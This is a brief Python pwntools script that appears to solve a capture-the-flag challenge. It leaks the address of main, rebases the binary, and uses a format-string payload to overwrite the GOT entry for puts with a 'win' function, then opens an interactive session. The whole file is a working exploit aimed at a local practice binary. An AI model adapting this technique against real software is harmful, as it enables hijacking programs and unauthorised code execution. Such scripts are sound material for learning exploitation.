# coding: utf-8
from pwn import *
def sol12():
    p=process("./chall_12")
    print(p.recvuntil("help: "))
    leak = int(p.recv(),16)
    context.binary = ELF("./chall_12")
    context.binary.address = leak - context.binary.sym.main
    payload = fmtstr_payload(7,{context.binary.got.puts:context.binary.sym.win})
    print(payload)
    p.sendline(payload)
    p.interactive()
    
sol12()
